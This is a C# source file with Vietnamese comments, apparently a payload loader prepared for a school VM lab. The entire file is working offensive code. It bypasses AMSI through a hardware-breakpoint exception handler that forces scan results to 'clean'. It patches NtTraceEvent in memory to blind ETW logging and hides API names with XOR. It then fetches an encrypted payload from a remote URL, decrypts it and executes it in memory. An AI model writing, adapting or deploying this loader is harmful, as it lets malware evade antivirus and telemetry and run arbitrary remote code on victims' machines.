// FinalLoaderV4_NoSandbox.cs — bản bỏ AntiSandbox (dùng cho VM lab)
// Fix: ctx.GpRegs[0] thay vì ctx.GpRegs (array assignment bug)
// Fix C# 5 compat: out var → khai báo trước, 20_000_000 → 20000000,
//   GC.GetGCMemoryInfo() → GlobalMemoryStatusEx, TickCount64 → TickCount,
//   async Task Main → sync + .GetAwaiter().GetResult()
// Môi trường: VM cô lập nhà trường
using System;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace FinalLoaderV4
{
    public class Program
    {
        // Key để decrypt tên hàm/dll trong code (tránh plain string)
        const string STRING_KEY = "LabSecretKey2026";

        [DllImport("kernel32", EntryPoint = "GetProcAddress")]
        static extern IntPtr _GetProcAddress(IntPtr hMod, string name);
        [DllImport("kernel32", EntryPoint = "LoadLibraryA")]
        static extern IntPtr _LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentThread();
        [DllImport("ntdll")]
        static extern int NtGetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("ntdll")]
        static extern int NtSetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("kernel32")]
        static extern IntPtr AddVectoredExceptionHandler(uint first, PVECTORED_EXCEPTION_HANDLER handler);
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint old);

        delegate int PVECTORED_EXCEPTION_HANDLER(ref EXCEPTION_POINTERS ep);

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_RECORD
        {
            public uint    ExceptionCode;
            public uint    ExceptionFlags;
            public IntPtr  ExceptionRecordPtr;
            public IntPtr  ExceptionAddress;
            public uint    NumberParameters;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        const uint CONTEXT_DEBUG_REGISTERS      = 0x00010010;
        const uint EXCEPTION_SINGLE_STEP        = 0x80000004;
        const int  EXCEPTION_CONTINUE_EXECUTION = -1;

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ulong[]  p1;
            public uint     ContextFlags;
            public uint     MxCsr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ushort[] SegRegs;
            public uint     EFlags;
            public ulong    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
            public ulong[]  GpRegs; // [0]=Rax, [1]=Rcx, ...
        }

        static PVECTORED_EXCEPTION_HANDLER vehCallback;
        static IntPtr targetAmsiAddr = IntPtr.Zero;

        // Decrypt tên hàm: hex XOR với STRING_KEY
        static string Dec(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            byte[] key = Encoding.UTF8.GetBytes(STRING_KEY);
            byte[] res = new byte[bytes.Length];
            for (int i = 0; i < bytes.Length; i++)
                res[i] = (byte)(bytes[i] ^ key[i % key.Length]);
            return Encoding.UTF8.GetString(res);
        }

        // VEH PATCHLESS AMSI
        static int VehHandler(ref EXCEPTION_POINTERS ep)
        {
            var rec = (EXCEPTION_RECORD)Marshal.PtrToStructure(
                          ep.ExceptionRecord, typeof(EXCEPTION_RECORD));

            if (rec.ExceptionCode == EXCEPTION_SINGLE_STEP &&
                rec.ExceptionAddress == targetAmsiAddr)
            {
                var ctx = (CONTEXT)Marshal.PtrToStructure(
                              ep.ContextRecord, typeof(CONTEXT));

                ctx.GpRegs[0] = 0;              // RAX = 0 = AMSI_RESULT_CLEAN
                ctx.EFlags &= ~(uint)0x10000;   // clear RF flag

                Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return 0;
        }

        static void SetupVehAmsi()
        {
            vehCallback    = new PVECTORED_EXCEPTION_HANDLER(VehHandler);
            AddVectoredExceptionHandler(1, vehCallback);

            IntPtr hAmsi   = _LoadLibrary(Dec("0D0411104D4F4F4A")); // "amsi.dll"
            targetAmsiAddr = _GetProcAddress(hAmsi, Dec("2D0411103028626D40030707004B")); // "AmsiScanBuffer"
            if (targetAmsiAddr == IntPtr.Zero) return;

            var ctx        = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
            IntPtr hThread = GetCurrentThread();
            NtGetContextThread(hThread, ref ctx);

            ctx.Dr0 = (ulong)targetAmsiAddr.ToInt64();
            ctx.Dr7 = 0x1;

            NtSetContextThread(hThread, ref ctx);
        }

        // ETW BYPASS
        static void EtwBypass()
        {
            IntPtr hNtdll  = _LoadLibrary(Dec("020D160B1F454F4A")); // "ntdll.dll"
            IntPtr ntTrace = _GetProcAddress(hNtdll, Dec("220D3615124866664719161B56")); // "NtTraceEvent"
            if (ntTrace == IntPtr.Zero) return;

            byte[] patch = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
            uint old     = 0;
            uint discard = 0;
            VirtualProtect(ntTrace, (UIntPtr)3, 0x40, out old);
            Marshal.Copy(patch, 0, ntTrace, 3);
            VirtualProtect(ntTrace, (UIntPtr)3, old, out discard);
        }

        // XOR decrypt payload
        static byte[] XorBytes(byte[] data, string key)
        {
            byte[] kk = Encoding.UTF8.GetBytes(key);
            byte[] r  = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ kk[i % kk.Length]);
            return r;
        }

        static void RunAssembly(byte[] asmBytes)
        {
            try
            {
                var asm    = Assembly.Load(asmBytes);
                var type   = asm.GetType("Target");
                var method = type.GetMethod("Run",
                    BindingFlags.Static | BindingFlags.Public);
                method.Invoke(null, null);
            }
            catch { }
        }

        // ============================================================
        // MAIN — AntiSandbox đã bỏ, dùng cho VM lab
        // args[0] = xorKey
        // args[1] = URL payload.bin
        // args[2] = payloadKey
        // ============================================================
        public static void Main(string[] args)
        {
            SetupVehAmsi();
            EtwBypass();

            if (args.Length < 3) return;
            string xorKey     = args[0];
            string payloadUrl = args[1];
            string payloadKey = args[2];

            byte[] enc = null;
            try
            {
                using (var handler = new HttpClientHandler())
                using (var client  = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    enc = client.GetByteArrayAsync(payloadUrl).GetAwaiter().GetResult();
                }
            }
            catch { return; }

            byte[] data = XorBytes(enc, payloadKey);
            RunAssembly(data);
        }
    }
}
